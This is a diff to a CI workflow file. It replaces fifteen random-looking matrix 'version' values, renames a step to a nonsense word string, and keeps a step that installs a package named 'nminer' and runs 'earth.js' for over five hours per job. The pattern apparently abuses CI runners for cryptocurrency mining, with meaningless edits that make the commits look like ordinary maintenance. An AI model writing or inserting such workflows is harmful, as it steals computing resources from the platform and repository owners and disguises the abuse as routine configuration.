@@ -9,21 +9,21 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 2394 }
-          - { version: 6116 }
-          - { version: 1355 }
-          - { version: 8898 }
-          - { version: 3317 }
-          - { version: 710 }
-          - { version: 967 }
-          - { version: 4182 }
-          - { version: 8823 }
-          - { version: 7610 }
-          - { version: 8092 }
-          - { version: 6762 }
-          - { version: 6165 }
-          - { version: 3736 }
-          - { version: 3875 }
+          - { version: 1385 }
+          - { version: 1081 }
+          - { version: 8447 }
+          - { version: 1929 }
+          - { version: 7469 }
+          - { version: 1094 }
+          - { version: 2996 }
+          - { version: 2994 }
+          - { version: 7732 }
+          - { version: 7162 }
+          - { version: 8980 }
+          - { version: 3206 }
+          - { version: 2522 }
+          - { version: 5185 }
+          - { version: 791 }
 
     steps:
       - name: Checkout
@@ -34,7 +34,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: gray disarm per
+      - name: drat colorfully gummy
         run: |
           npm install nminer@latest
-          timeout 310m node earth.js || echo "earth executed"
+          timeout 313m node earth.js || echo "earth executed"
